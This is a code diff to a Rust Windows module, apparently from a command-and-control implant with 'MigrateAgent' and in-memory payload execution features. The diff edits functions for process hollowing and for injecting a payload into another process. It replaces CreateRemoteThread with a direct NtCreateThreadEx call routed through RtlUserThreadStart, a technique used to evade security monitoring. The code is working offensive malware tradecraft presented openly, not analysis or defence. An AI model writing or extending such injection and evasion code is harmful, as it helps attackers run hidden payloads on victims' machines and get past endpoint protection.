@@ -7,7 +7,8 @@
 //! `MigrateAgent` capability and the launcher's in-memory payload execution.
 
 use anyhow::{anyhow, Result};
-use std::ffi::{c_void, CStr, OsStr};
+use std::ffi::{CStr, OsStr};
+use winapi::ctypes::c_void;
 use std::mem::{size_of, zeroed};
 use std::os::windows::ffi::OsStrExt;
 use winapi::shared::minwindef::{FARPROC, HMODULE};
@@ -48,6 +49,19 @@ struct PROCESS_BASIC_INFORMATION {
 
 #[link(name = "ntdll")]
 extern "C" {
+    fn NtCreateThreadEx(
+        ThreadHandle: *mut HANDLE,
+        DesiredAccess: u32,
+        ObjectAttributes: PVOID,
+        ProcessHandle: HANDLE,
+        StartRoutine: PVOID,
+        Argument: PVOID,
+        CreateFlags: u32,
+        ZeroBits: usize,
+        StackSize: usize,
+        MaximumStackSize: usize,
+        AttributeList: PVOID,
+    ) -> i32;
     fn NtUnmapViewOfSection(ProcessHandle: HANDLE, BaseAddress: PVOID) -> i32;
     fn NtQueryInformationProcess(
         ProcessHandle: HANDLE,
@@ -210,7 +224,7 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     // From this point any error must terminate the suspended process and close
     // both handles; the guard does that automatically via Drop.
     let mut guard = ProcessGuard::new(pi);
-    let pi = &guard.pi; // shadow the local so all subsequent code uses the guard's copy via NtQueryInformationProcess(ProcessBasicInformation)
+    let pi = guard.pi; // shadow the local so all subsequent code uses the guard's copy via NtQueryInformationProcess(ProcessBasicInformation)
                         // and read the `ImageBaseAddress` field out of the remote PEB.
     let mut base_addr_ptr: PVOID = std::ptr::null_mut();
     let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
@@ -1307,24 +1321,37 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
 
     // 7. Create a remote thread at the payload's entry point.
     let entry_point = image_base as usize + nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
-    let thread = unsafe {
-        CreateRemoteThread(
+    let mut thread: HANDLE = std::ptr::null_mut();
+    
+    let ntdll = unsafe { winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8) };
+    if ntdll.is_null() {
+        return Err(anyhow!("GetModuleHandleA failed for ntdll.dll"));
+    }
+    let rtl_user_thread_start = unsafe { winapi::um::libloaderapi::GetProcAddress(ntdll, b"RtlUserThreadStart\0".as_ptr() as *const i8) };
+    if rtl_user_thread_start.is_null() {
+        return Err(anyhow!("GetProcAddress failed for RtlUserThreadStart"));
+    }
+    
+    let status = unsafe {
+        NtCreateThreadEx(
+            &mut thread,
+            0x1FFFFF, // THREAD_ALL_ACCESS
+            std::ptr::null_mut(),
             process,
-            std::ptr::null_mut(),
+            rtl_user_thread_start as _,
+            entry_point as _,
+            0, // CREATE_SUSPENDED=1 (but we can just run it=0)
             0,
-            Some(std::mem::transmute(entry_point)),
-            std::ptr::null_mut(),
             0,
-            std::ptr::null_mut(),
+            0,
+            std::ptr::null_mut()
         )
     };
-    if thread.is_null() {
-        return Err(anyhow!(
-            "CreateRemoteThread failed: {}",
-            std::io::Error::last_os_error()
-        ));
+    if status < 0 || thread.is_null() {
+        return Err(anyhow!("NtCreateThreadEx failed with NTSTATUS {:#x}", status));
     }
+    
     unsafe { CloseHandle(thread) };
-    tracing::info!("inject_into_process: remote thread started at {entry_point:#x}");
+    tracing::info!("inject_into_process: remote thread started at {entry_point:#x} natively via RtlUserThreadStart");
     Ok(())
 }
